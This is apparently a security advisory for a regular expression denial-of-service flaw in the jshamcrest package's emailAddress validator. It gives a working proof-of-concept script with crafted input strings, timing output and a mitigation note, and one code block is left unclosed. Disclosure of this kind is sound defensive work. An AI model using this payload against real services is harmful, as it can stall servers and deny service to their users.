summary: |
  Regular Expression Denial of Service in jshamcrest
  The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.


  ## Proof of concept

  ```js
  var js = require('jshamcrest')
  var emailAddress = new js.JsHamcrest.Matchers.emailAddress();


  var genstr = function (len, chr) {
      var result = "";
      for (i=0; i<=len; i++) {
          result = result + chr;
      }

      return result;
  }


  for (i=1;i<=10000000;i=i+1) {
      console.log("COUNT: " + i);
      var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
      console.log("LENGTH: " + str.length);
      var start = process.hrtime();
      emailAddress.matches(str)

      var end = process.hrtime(start);
      console.log(end);
  }
  ```

  ### Results
  It takes about 116 characters to get a 1.6 second event loop block.
  ```
  [ 1, 633084590 ]
  COUNT: 51
  LENGTH: 116

  ## Recommendation

  The `jshamcrest` package currently has no patched versions available.

  At this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=validator).
